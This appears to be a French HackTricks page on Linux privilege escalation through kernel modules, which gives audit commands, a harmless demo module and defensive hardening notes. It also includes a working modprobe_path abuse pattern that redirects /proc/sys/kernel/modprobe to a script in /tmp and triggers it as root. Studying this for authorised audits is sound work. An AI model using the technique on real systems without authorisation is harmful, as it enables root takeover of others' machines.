# Modules du noyau et abus de modprobe

{{#include ../../banners/hacktricks-training.md}}

## Erreurs de configuration des modules du noyau et du chargement des modules

La prise en charge des modules du noyau est un domaine à fort impact lors de l’examen d’une escalation de privilèges Linux. Ne considérez pas chaque message concernant un module non signé comme exploitable en soi, mais utilisez-le pour répondre à des questions pratiques :

- L’utilisateur actuel peut-il charger des modules via `sudo`, des capabilities ou un chemin d’assistant accessible en écriture ?
- Le chargement des modules est-il toujours activé ?
- L’application des signatures des modules est-elle désactivée ?
- Les répertoires de modules ou les fichiers de modules sont-ils accessibles en écriture ?
- Les journaux du noyau peuvent-ils être lus pour confirmer ce qui s’est produit ?

Triage rapide :
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interprétation :

- `modules_disabled=1` signifie que de nouveaux modules ne peuvent pas être chargés avant le redémarrage.
- `module_sig_enforce=1` bloque généralement les modules non signés.
- `dmesg_restrict=0` permet aux utilisateurs non privilégiés de lire les journaux du kernel sur de nombreux systèmes.
- Les chemins accessibles en écriture sous `/lib/modules/$(uname -r)/` sont dangereux, car la découverte et l’auto-chargement des modules peuvent faire confiance à cette arborescence.

### Charger un module et lire la sortie du kernel

Si vous disposez d’une autorisation légitime pour charger un module local, `insmod` insère le fichier `.ko` exact que vous fournissez. La fonction d’initialisation du module s’exécute immédiatement, et les messages écrits avec `printk()` apparaissent dans les journaux du kernel.

Workflow minimal pour les environnements de revue ou de laboratoire :
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Si `sudo -l` autorise `insmod`, `modprobe` ou un wrapper autour de ces commandes, considérez cela comme critique :
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` autorisé par Sudo

Une règle Sudo permettant à un utilisateur d’exécuter `insmod` n’est pas comparable à l’autorisation d’utiliser un helper administratif normal. Le code d’initialisation du module s’exécute dans le contexte du kernel dès que le fichier `.ko` est inséré. La question pratique lors de l’audit est donc la suivante : « cet utilisateur peut-il choisir ou modifier le module chargé ? »

Flux d’audit générique :
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Si l’utilisateur peut fournir un fichier `.ko` arbitraire, la règle doit être considérée comme une compromission complète du système dans le cadre d’un assessment autorisé. Une approche opérationnelle plus sûre consiste à éviter de déléguer le chargement des modules via sudo ; si cela est inévitable, limitez le chemin exact, la propriété, les permissions, la politique de signature et le workflow de suppression.

Pour un pattern inoffensif de compilation de module dans un environnement de test contrôlé, un source minimal et un Makefile ressemblent à ceci :
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Construisez et chargez uniquement dans un laboratoire autorisé :
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Contrôles d’abus de `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` contrôle l’assistant de l’espace utilisateur que le kernel invoque lorsqu’il a besoin d’aide pour charger un module. Si un attaquant peut le modifier afin de pointer vers le chemin d’un exécutable accessible en écriture et déclencher un format binaire inconnu ou un autre mécanisme de demande de module, cela peut permettre une exécution de code avec les privilèges root.

Vérifiez l’assistant actuel :
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Vérifiez si vous pouvez l'influencer :
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Modèle générique réservé aux labs :
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Sur les systèmes renforcés, cela devrait échouer, car les utilisateurs non privilégiés ne peuvent pas écrire dans `kernel.modprobe`, le chemin de l’helper n’est pas inscriptible ou les chemins de chargement des modules sont bloqués.

### Vérification des répertoires `/lib/modules` inscriptibles

Les répertoires de modules inscriptibles peuvent permettre le remplacement de modules, le dépôt de modules malveillants ou l’abus du chargement automatique, selon la manière dont `modprobe` est ensuite invoqué.

Vérifiez les emplacements inscriptibles :
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Si vous trouvez du contenu de module accessible en écriture, vérifiez comment les modules sont découverts :
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Notes défensives :

- Gardez `/lib/modules` appartenant à `root:root` et non accessible en écriture par les utilisateurs.
- Définissez `kernel.modules_disabled=1` après le démarrage lorsque cela est possible sur le plan opérationnel.
- Appliquez la signature des modules sur les systèmes nécessitant des modules chargeables.
- Surveillez les écritures dans `/proc/sys/kernel/modprobe` et `/lib/modules`, ainsi que l’exécution inattendue de `insmod`/`modprobe`.
